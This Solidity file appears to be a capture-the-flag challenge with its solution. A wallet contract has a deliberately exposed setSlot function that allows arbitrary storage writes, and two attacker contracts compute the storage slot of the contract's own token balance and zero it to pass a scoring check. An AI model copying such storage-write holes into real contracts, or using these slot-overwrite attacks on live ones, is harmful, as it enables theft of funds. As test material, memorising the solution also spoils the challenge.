// 1.加入钱包.2.fake钱包余额归零
//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;
interface IERC20 {

    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);


    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}


contract ERC20 is IERC20 {

    string public constant name = "ERC20";
    string public constant symbol = "ERC";
    uint8 public constant decimals = 18;
    mapping(address => uint256) balances;

    mapping(address => mapping (address => uint256)) allowed;

    uint256 totalSupply_ = 10 ether;


   constructor() {
    balances[msg.sender] = totalSupply_;
    }

    function totalSupply() public override view returns (uint256) {
    return totalSupply_;
    }

    function balanceOf(address tokenOwner) public override view returns (uint256) {
        return balances[tokenOwner];
    }

    function transfer(address receiver, uint256 numTokens) public override returns (bool) {
        require(numTokens <= balances[msg.sender]);
        balances[msg.sender] = balances[msg.sender]-numTokens;
        balances[receiver] = balances[receiver]+numTokens;
        emit Transfer(msg.sender, receiver, numTokens);
        return true;
    }

    function approve(address delegate, uint256 numTokens) public override returns (bool) {
        allowed[msg.sender][delegate] = numTokens;
        emit Approval(msg.sender, delegate, numTokens);
        return true;
    }

    function allowance(address owner, address delegate) public override view returns (uint) {
        return allowed[owner][delegate];
    }

    function transferFrom(address owner, address buyer, uint256 numTokens) public override returns (bool) {
        require(numTokens <= balances[owner]);
        require(numTokens <= allowed[owner][msg.sender]);

        balances[owner] = balances[owner]-numTokens;
        allowed[owner][msg.sender] = allowed[owner][msg.sender]-numTokens;
        balances[buyer] = balances[buyer]+numTokens;
        emit Transfer(owner, buyer, numTokens);
        return true;
    }
}

contract wallet{
    struct Wallet{
        string walletName;
        uint256 uniqueTokens;
        mapping(address => uint256)balances;
    }
    struct Slot{
        bytes32 value;
    }
    mapping(address => Wallet[])public wallets;
    ERC20 public fake;
    constructor(){
        fake = new ERC20();
        
        wallets[address(this)].push();
        Wallet storage wallet = wallets[address(this)][0];
        wallet.walletName="cuit";
        wallet.uniqueTokens=1;
        wallet.balances[address(fake)]= 10 ether;
    }
    

    function addWallet(string memory name,address _token,uint256 amount)public{
        require(IERC20(_token).transferFrom(msg.sender,address(this),amount),"transferFrom failed");

        wallets[msg.sender].push();
        Wallet storage wallet = wallets[msg.sender][wallets[msg.sender].length-1];
        wallet.walletName=name;
        wallet.uniqueTokens=1;
        wallet.balances[_token] = amount;
    }

    function addWalletToken(uint256 index,address _token,uint256 amount)public{
        require(IERC20(_token).transferFrom(msg.sender,address(this),amount),"transferFrom failed");
        require(index<wallets[msg.sender].length);

        Wallet storage wallet = wallets[msg.sender][index];
        wallet.uniqueTokens++;
        wallet.balances[_token] = amount;
    }

    function getTokenBalance(address _addr,uint256 index,address _token)public view returns(uint256 amount){
        return wallets[_addr][index].balances[_token];
    }   

    function setSlot(bytes32 slot,bytes32 value)public {
        require(slot !=bytes32(uint256(2)));
        Slot storage s;
        assembly{
            s.slot := slot
        }
        s.value=value;
    }

}

contract att1{
    check che;
    constructor(check addr) {
        che = addr;
    }
    function attract() public {
        che.addWallet("zp",address(che.fake()),0);
        che.setSlot(getSlot(),0);
        che.isCompleted();
    }
    function getWalletarr() public view returns(bytes32){
        return keccak256(abi.encodePacked(bytes32(uint256(uint160(address(che)))),bytes32(uint256(0))));
    }
    function getWallet() public view returns(bytes32){
        return keccak256(abi.encodePacked(getWalletarr()));
    }
    function getBalancemap(uint256 index) public view returns(bytes32){
        return bytes32(uint256(getWallet()) + 3 * index + 2);
    }
    function getBalance(uint256 index) public view returns(bytes32){
        return keccak256(abi.encodePacked(bytes32(uint256(uint160(address(che.fake())))),getBalancemap(index)));
    }
    function getSlot() public view returns(bytes32){
        return keccak256(abi.encodePacked(bytes32(uint256(uint160(address(che.fake())))),bytes32((uint256(keccak256(abi.encodePacked(keccak256(abi.encodePacked(bytes32(uint256(uint160(address(che)))),bytes32(uint256(0))))))) + 0 * 3 + 2))));
    }

}

contract check is wallet{
    uint256 public score;
    function isCompleted()public{
        score =0;
        if(wallets[msg.sender].length>0){
            score+=25;
        }
        if(wallets[address(this)][0].balances[address(fake)]==0){
            score+=75;
        }
    }
}
contract att{
    check public che;
    ERC20 public erc20;
    constructor(address addr) public {
        che = check(addr);
        erc20 = che.fake();
    }
    bytes32 public arraySolt = keccak256(abi.encodePacked(bytes32(uint256(uint160(address(che)))),bytes32(0)));
    bytes32 public arrayIndexSolt = keccak256(abi.encodePacked(arraySolt));
    bytes32 public WalletBalancesSolt = bytes32(uint256(arrayIndexSolt) + 2);
    bytes32 public WalletBalancesSoltIndex = keccak256(abi.encodePacked(bytes32(uint256(uint160(address(erc20)))),bytes32(WalletBalancesSolt)));
    function getWalletsSlot(uint256 slot,address addr) public pure returns(bytes32){
        return keccak256(abi.encodePacked(bytes32(uint256(uint160(addr))),bytes32(slot)));
    }
    function getWalletSlot(bytes32 slot,uint256 index) public pure returns(bytes32){
        return bytes32(uint256(keccak256(abi.encodePacked(slot))) + index);
    }
    function getBalancesSlot(bytes32 slot,uint256 index) public pure returns(bytes32){
        return bytes32(uint256(slot) + index);
    }
    function getBalanceSlot(bytes32 slot,address token) public pure returns(bytes32){
        return keccak256(abi.encodePacked(bytes32(uint256(uint160(token))),slot));
    }
    function attract() public {
        che.addWallet("zp",address(erc20),0);
        bytes32 a = getBalanceSlot(getBalancesSlot(getWalletSlot(getWalletsSlot(0,address(che)),0),2),address(erc20));
        che.setSlot(a,0);
        che.isCompleted();
    }
}